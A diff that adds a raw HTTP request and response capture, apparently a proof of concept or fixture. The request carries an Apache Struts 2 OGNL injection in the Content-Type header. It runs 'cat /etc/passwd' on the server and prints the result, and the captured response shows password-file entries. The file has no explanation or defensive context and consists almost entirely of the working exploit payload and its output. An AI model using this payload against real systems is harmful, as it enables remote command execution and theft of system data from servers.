@@ -1,0 +1,26 @@
+POST /orders/new.action HTTP/1.1
+Host: vulnerable-app.internal
+Content-Type: %{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
+(#a=@java.lang.Runtime@getRuntime().exec('cat /etc/passwd')).
+(#b=new java.io.InputStreamReader(#a.getInputStream())).
+(#c=new java.io.BufferedReader(#b)).
+(#d=new char[50000]).
+(#c.read(#d)).
+(#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).
+(#out.println(#d)).
+(#out.close())}
+Content-Length: 0
+
+
+HTTP/1.1 200 OK
+Content-Type: text/html;charset=UTF-8
+X-CMD: cat /etc/passwd
+Content-Length: 2035
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+...
+mysql:x:999:999:MySQL Server:/var/lib/mysql:/bin/false
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
